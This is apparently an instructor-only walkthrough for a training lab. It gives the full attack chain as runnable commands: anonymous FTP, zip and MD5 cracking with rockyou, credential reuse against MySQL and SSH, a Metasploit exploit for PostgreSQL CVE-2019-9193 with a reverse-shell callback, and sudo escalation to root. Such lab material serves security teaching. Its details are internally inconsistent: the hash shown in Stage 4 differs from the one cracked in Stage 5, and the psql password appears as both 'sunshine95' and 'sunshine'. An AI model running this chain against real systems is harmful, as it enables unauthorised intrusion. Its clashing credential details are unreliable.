# InfraBreak: Exploitation Lab 01 — Walkthrough
## ⚠️ Instructor Reference Only — Do Not Share With Students

---

## Attack Chain Overview

```
nmap scan
  → FTP anonymous login → Flag 1 (/pub/flag.txt)
    → encrypted zip (bruteforce: monkey1987) → Flag 2 (inside zip)
      → DB creds in logs (dbadmin:C0rp0r4te#2024)
        → MySQL dump → Flag 3 (internal_flags table)
          → SSH private keys (charlie works)
            → SSH as charlie → Flag 4 (~/flag.txt) + hash hint
              → crack MD5 hash → sunshine
                → psql pgadmin:sunshine
                  → Metasploit CVE-2019-9193 RCE → Flag 5 (/var/lib/postgresql/flag.txt)
                    → sudo /bin/bash → root → Flag 6 (/root/root_flag.txt)
```

---

---

## Stage 1 — Reconnaissance & FTP (Flag 1)

```bash
# Discover open ports
nmap -sV -Pn <TARGET_IP>
# Open: 21/ftp, 22/ssh, 3306/mysql, 5432/postgresql

# Connect to FTP anonymously
ftp <TARGET_IP>
# Username: anonymous | Password: (blank or any email)

# Navigate and download everything
ftp> ls
ftp> cd pub
ftp> ls -R
ftp> mget *            # download all files
```

**Files found:**
- `flag.txt` → **Flag 1:** `ECOM{anon_ftp_is_a_bad_idea}`
- `logs/access_2024_01.log` — decoy, mentions backup
- `logs/access_2024_02.log` — decoy
- `reports/q1_summary.txt` — decoy
- `reports/q2_summary.txt` — decoy
- `backups/db_backup_march.zip` — **encrypted**

---

## Stage 2 — Crack the ZIP (Flag 2)

```bash
# Extract hash from zip
zip2john db_backup_march.zip > zip.hash

# Crack with John + rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

# Password found: monkey1987  (takes a few minutes in rockyou)

# Extract the zip
unzip -P monkey1987 db_backup_march.zip
```

**Inside the zip:**
- `logs/flag.txt` → **Flag 2:** `ECOM{zip_crack3d_w1th_r0cky0u}`
- `logs/db_maintenance_2024_03.log` — contains cleartext DB creds
- `logs/error_2024_03.log` — decoy errors

**Creds extracted from log:**
```
user=dbadmin password=C0rp0r4te#2024 database=internaldb
```

---

## Stage 3 — MySQL Enumeration (Flag 3)

```bash
mysql -h <TARGET_IP> -u dbadmin -p'C0rp0r4te#2024' internaldb

# Dump tables
SHOW TABLES;

# Table: employees — decoy data (names, emails, departments)
SELECT * FROM employees;

# Table: projects — decoy data
SELECT * FROM projects;

# Table: internal_flags — Flag 3 is hiding here
SELECT * FROM internal_flags;
# Flag 3: ECOM{db_dump_succ3ssful_g00d_j0b}

# Table: ssh_users — THE GOODS
SELECT username, ssh_private_key, note FROM ssh_users;
```

**Keys found:**
- `alice` — note says "decommissioned" (decoy)
- `charlie` — note says "Monitoring access - active" (**use this one**)

---

## Stage 4 — SSH Access as Charlie (Flag 4)

```bash
# Save charlie's key to a file
# (copy from DB output)
nano charlie.key
chmod 600 charlie.key

# Connect
ssh -i charlie.key charlie@<TARGET_IP>
```

**Files in charlie's home:**
- `flag.txt` → **Flag 4:** `ECOM{ssh_k3y_fr0m_db_n1c3_w0rk}`
- `notes.txt` → Contains MD5 hash: `0571749e2ac330a7455809c6b0e7af90` + hint about pgadmin on port 5432

---

## Stage 5 — Crack the Hash

```bash
# Save hash
echo "3a6d42c88c2b5f1a7dfe23c4b89a0e7f" > hash.txt

# Crack with hashcat (MD5)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Or with John
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Password: sunshine
```

---

## Stage 6 — PostgreSQL → RCE via CVE-2019-9193 (Flag 5)

```bash
# Verify connection
psql -h <TARGET_IP> -U pgadmin -W
# Password: sunshine95

# Metasploit exploit
msfconsole

use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS <TARGET_IP>
set USERNAME pgadmin
set PASSWORD sunshine
set LHOST <YOUR_KALI_IP>
run
```

**Shell as postgres user — read Flag 5, then escalate to root:**

```bash
# Flag 5 is readable by the postgres user
cat /var/lib/postgresql/flag.txt
# ECOM{rce_v1a_cve_2019_9193_pwned}

# Escalate to root (Flag 6)
sudo /bin/bash

cat /root/root_flag.txt
# ECOM{r00t_0wn3d_infrabreak_01_gg}
```

---

## Teaching Points

| Stage | Concept |
|-------|---------|
| FTP anon | Exposed services, unnecessary anonymous access |
| ZIP bruteforce | Password strength, offline cracking with rockyou |
| DB creds in logs | Sensitive data in plaintext logs, log hygiene |
| SSH key in DB | Secrets should never be stored in databases |
| Hash cracking | MD5 is weak, rockyou wordlist, credential hygiene |
| CVE-2019-9193 | Unpatched PostgreSQL COPY TO/FROM PROGRAM (RCE as postgres service user) |
| Privilege escalation | Sudo misconfiguration |
